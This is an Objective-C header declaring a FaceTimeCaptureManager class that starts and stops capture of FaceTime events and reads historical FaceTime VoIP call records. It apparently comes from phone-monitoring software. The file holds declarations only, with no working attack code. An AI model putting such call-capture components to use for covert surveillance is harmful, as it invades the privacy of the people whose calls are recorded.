//
//  FaceTimeCaptureManager.h
//  FaceTimeCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 7/22/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "TelephonyNotificationManager.h"
#import "EventDelegate.h"


@class TelephonyNotificationManagerImpl;


@interface FaceTimeCaptureManager : NSObject {
@private
	TelephonyNotificationManagerImpl	*mTelephonyNotificationManagerImpl;
	id <EventDelegate>					mEventDelegate;
	id <TelephonyNotificationManager>	mTelephonyNotificationManager;
	BOOL								mListening;
	NSString							*mAC;
	NSArray								*mNotCaptureNumbers;
	
	NSUInteger							mCallHistoryMaxRowID;
}

@property (nonatomic, copy) NSString *mAC;
@property (nonatomic, retain) NSArray *mNotCaptureNumbers;
@property (nonatomic, assign) NSUInteger mCallHistoryMaxRowID;

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate andTelephonyNotificationCenter:(id <TelephonyNotificationManager>) aTelephonyNotificationManager;
- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate;
- (void) startCapture;
- (void) stopCapture;

// -- Historical Facetime VoIP

+ (NSArray *) allFaceTimeVoIPs;
+ (NSArray *) allFaceTimeVoIPsWithMax: (NSInteger) aMaxNumber;

@end
